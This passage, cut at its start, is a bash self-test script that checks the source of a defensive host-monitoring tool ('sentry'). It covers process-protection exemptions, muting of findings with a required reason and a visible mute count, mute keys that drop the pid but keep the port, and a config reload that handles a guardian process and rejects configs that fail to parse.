   && printf '%s' "$mode_fn" | grep -q "netprocsvc) printf 'ignore-port'" \
   && printf '%s' "$arm" | grep -q 'pid_service'; then
  hok 'only netprocsvc skips the port test, and only with the no-unit test in its place'
else
  hno 'the protected-port exemption is not confined to netprocsvc, or has lost its no-unit test'
fi

# can_automate offers the item; the action re-checks before the kill. If that
# second check is stricter, sentry refuses its own offer and the operator gets
# FAILED with nothing to do next. Both must go through protection_mode_for.
bare=$(for fn in can_automate action_live_process action_port_common; do
  sed -n "/^$fn() {/,/^}/p" "$ROOT/linux/sentry.sh" \
    | grep -n 'pid_is_protected' | grep -v 'protection_mode_for' | sed "s|^|$fn:|"
done)
if [ -z "$bare" ]; then
  hok 'the offer and the pre-kill re-check ask the protection question the same way'
else
  hno 'can_automate and the live-process action can disagree about the same pid'
  printf '%s\n' "$bare" | sed 's/^/    /'
fi

# "That one is mine, stop asking" had no answer at all, so every AMBER finding
# an operator had already judged came back on the next pass, forever.
if grep -q 'mine:  sudo' "$ROOT/linux/sentry.sh" \
   && [ "$(grep -c 'mine:  sudo' "$ROOT/linux/sentry.sh")" = 3 ]; then
  hok 'every finding prints how to record it as a standing exception'
else
  hno 'some render path offers no way to silence a finding the operator has judged'
fi

# Silenced must never mean invisible.
if awk '/^write_alerts\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q ccdc_mute_count \
   && grep -q ccdc_mute_count "$ROOT/linux/triage.sh" 2>/dev/null \
      || awk '/^write_alerts\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q ccdc_mute_count; then
  hok 'the number of silenced findings is printed whether or not anything else is wrong'
else
  hno 'a muted finding can be invisible: no report prints the count'
fi

# A reason is required, or an exception cannot be told from a thing forgotten.
if awk '/^do_mute\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q 'needs --reason'; then
  hok 'a standing exception cannot be recorded without a reason'
else
  hno 'an exception can be recorded with no reason, so it reads as a thing someone forgot'
fi

# The key drops the pid and keeps the port. Without the pid dropped it stops
# working at the next restart; without the port, muting your own python service
# also silences a python web shell on a different port - which is the exact
# hiding place the netprocsvc check exists to find.
rt=$(bash -c '
  set -u
  . "'"$ROOT"'/linux/lib/common.sh"
  a=$(ccdc_mute_key netprocsvc "pid111:/usr/bin/python3.12 tcp/4447")
  b=$(ccdc_mute_key netprocsvc "pid999:/usr/bin/python3.12 tcp/4448")
  c=$(ccdc_mute_key netprocsvc "pid222:/usr/bin/python3.12 tcp/4447")
  [ "$a" = "$c" ] || { echo "the same service under a new pid does not match its own exception"; exit 1; }
  [ "$a" != "$b" ] || { echo "two services on different ports share one exception key"; exit 1; }
  case "$a" in *tcp/4447) ;; *) echo "the port is not part of the key: $a"; exit 1 ;; esac
  case "$a" in *pid*) echo "the pid survived into the key: $a"; exit 1 ;; esac
  echo ok
' 2>&1 | tail -1)
if [ "$rt" = ok ]; then
  hok 'an exception survives a restart and cannot silence a second service'
else
  hno "mute key: $rt"
fi

# Telling the operator to edit a config the running loop does not read is worse
# than saying nothing: they do it, nothing changes, and the second attempt -
# editing the installed copy - is reverted by guardian within a minute with
# nothing printed. Measured on the lab box at 75 seconds.
gap=$(for t in sentry.sh baseline.sh triage.sh; do
  grep -qE 'CCDC_(ALLOWED_TCP_PORTS|SYSTEMD_SERVICES|ALLOWED_USERS)' "$ROOT/linux/$t" || continue
  grep -q 'reload-config' "$ROOT/linux/$t" || printf ' %s' "$t"
done)
if [ -z "$gap" ]; then
  hok 'every tool that suggests a config edit says how to make it reach the loop'
else
  hno "tells the operator to edit a config and stops there:$gap"
fi

# And the command it names has to do the guardian dance, or it is the same trap
# one level up.
if awk '/^do_reload_config\(\)/,/^}/' "$ROOT/linux/sentry.sh" \
   | grep -q 'guardian_is_armed' \
   && awk '/^do_reload_config\(\)/,/^}/' "$ROOT/linux/sentry.sh" \
      | grep -q '"$guardian_sh" --config "$config" --install --apply'; then
  hok 'the reload takes guardian down and puts it back, in that order'
else
  hno 'the reload does not handle guardian, so the change is reverted within a tick'
fi

# A config with a syntax error takes the loop down, and the loop is what would
# have told you.
if awk '/^do_reload_config\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -q 'bash -n'; then
  hok 'the reload refuses a config that does not parse'
else
  hno 'a broken config can be installed under the supervised loop'
fi

printf 'sentry source checks: %s passed, %s failed\n' "$hpass" "$hfail"
[ "$hfail" -eq 0 ] || exit 1
